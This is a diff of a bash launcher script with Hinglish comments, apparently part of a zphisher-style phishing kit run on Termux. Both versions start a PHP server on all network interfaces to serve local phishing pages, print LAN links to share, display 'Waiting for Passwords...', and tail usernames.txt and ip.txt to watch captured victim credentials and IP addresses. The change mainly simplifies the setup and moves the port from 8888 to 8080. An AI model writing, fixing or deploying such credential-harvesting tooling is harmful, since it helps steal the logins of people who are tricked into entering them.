@@ -1,70 +1,59 @@
 #!/bin/bash
 
-# --- 🛠️ 1. SETUP SAFE FOLDER (Termux Friendly) ---
-# Hum Home folder me ek safe jagah banayenge
-SAFE_DIR="$HOME/.zphisher_tmp"
-mkdir -p "$SAFE_DIR"
-chmod 777 "$SAFE_DIR"
+# --- 1. SETUP ---
+# Folder banana
+mkdir -p "$HOME/.zphisher_tmp"
+chmod 777 "$HOME/.zphisher_tmp" 2>/dev/null
 
-# --- 🧹 2. KILL OLD PROCESSES ---
-# Purana sab kuch band karo
-pkill -f php > /dev/null 2>&1
-rm -rf php_error.log
+# --- 2. CLEANUP (Fix for Line 13) ---
+# Yahan '|| true' lagaya hai taaki agar koi error aaye to bhi script ruke nahi
+pkill -f php > /dev/null 2>&1 || true
+rm -rf php_error.log 2>/dev/null
 
-# --- 🎨 3. INTERFACE ---
-GREEN='\033[1;32m'
-CYAN='\033[1;36m'
-RED='\033[1;31m'
-YELLOW='\033[1;33m'
-RESET='\033[0m'
+# --- 3. COLORS ---
+RED=$(tput setaf 1)
+GREEN=$(tput setaf 2)
+CYAN=$(tput setaf 6)
+RESET=$(tput sgr0)
 
 clear
-echo -e "${GREEN}╔══════════════════════════════════════╗${RESET}"
-echo -e "${GREEN}║     ${YELLOW}ULTIMATE FIX MODE (Port 8888)${GREEN}    ║${RESET}"
-echo -e "${GREEN}╚══════════════════════════════════════╝${RESET}"
+echo "${RED}========================================${RESET}"
+echo "${RED}       ANURAG HKR (Auto-Server)        ${RESET}"
+echo "${RED}========================================${RESET}"
 echo ""
-echo -e "${CYAN}[*] Starting Server...${RESET}"
+echo "${CYAN}[*] Starting PHP Server...${RESET}"
 
-# --- 🚀 4. THE MAGIC COMMAND (Isme sab kuch direct set hai) ---
-# Hum '-d' flag ka use karke PHP ko force kar rahe hain
-# Ab 'Permission Denied' aa hi nahi sakta
-php -S 0.0.0.0:8888 -t . \
-    -d session.save_path="$SAFE_DIR" \
-    -d upload_tmp_dir="$SAFE_DIR" \
-    -d sys_temp_dir="$SAFE_DIR" \
-    > php_error.log 2>&1 &
-
+# --- 4. START SERVER (Port 8080 - Safer Port) ---
+# Humne port 8888 se 8080 kar diya hai (kabhi kabhi 8888 busy hota hai)
+php -S 0.0.0.0:8080 -t . > php_error.log 2>&1 &
 PID=$!
-sleep 3
+sleep 2
 
-# --- 🔍 5. CHECK & DIAGNOSE ---
+# --- 5. FINAL CHECK ---
 if ps -p $PID > /dev/null; then
-   # SUCCESS: Server chal gaya
-   echo -e "${GREEN}[✔] Server Started Successfully!${RESET}"
-   echo -e "${YELLOW}----------------------------------------${RESET}"
-   echo -e "${CYAN}Link 1: http://localhost:8888${RESET}"
-   
-   # IP Address nikalna
-   MYIP=$(ifconfig 2>/dev/null | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | grep -v "127.0.0.1" | head -n 1)
-   if [ ! -z "$MYIP" ]; then
-       echo -e "${CYAN}Link 2: http://$MYIP:8888${RESET}"
-   fi
-   echo -e "${YELLOW}----------------------------------------${RESET}"
-   echo -e "${RED}[-] Press Ctrl + C to Exit${RESET}"
+   echo "${GREEN}[✔] SERVER IS RUNNING!${RESET}"
    echo ""
-   echo -e "${GREEN}Waiting for Password...${RESET}"
+   echo "${CYAN}Link 1: http://localhost:8080${RESET}"
    
-   # Monitoring Loop
-   tail -f usernames.txt ip.txt --pid=$PID 2>/dev/null | while read line; do
-       echo -e "${GREEN}$line${RESET}"
-   done
+   # IP nikalne ka simple tareeka
+   MYIP=$(ifconfig | grep -oE "192\.168\.[0-9]+\.[0-9]+" | head -n 1)
+   if [ -z "$MYIP" ]; then
+       MYIP=$(ifconfig | grep -oE "10\.[0-9]+\.[0-9]+\.[0-9]+" | head -n 1)
+   fi
+
+   if [ ! -z "$MYIP" ]; then
+      echo "${CYAN}Link 2: http://$MYIP:8080${RESET}"
+   fi
+   
+   echo ""
+   echo "${RED}[!] Press Ctrl + C to Stop${RESET}"
+   echo "${GREEN}Waiting for Passwords...${RESET}"
+   
+   # Log check loop
+   tail -f usernames.txt ip.txt 2>/dev/null
 
 else
-   # FAILURE: Agar ab bhi nahi chala, to asli wajah dikhao
-   echo -e "${RED}[!] CRITICAL ERROR: Server Crash Ho Gaya!${RESET}"
-   echo -e "${YELLOW}नीचे दिए गए Error को पढ़िये:${RESET}"
-   echo -e "${RED}========================================${RESET}"
+   echo "${RED}[!] ERROR: Server start nahi hua!${RESET}"
+   echo "${YELLOW}Checking php_error.log...${RESET}"
    cat php_error.log
-   echo -e "${RED}========================================${RESET}"
-   echo -e "${CYAN}Tip: Agar 'Syntax error' hai to apni index.php check karein.${RESET}"
 fi
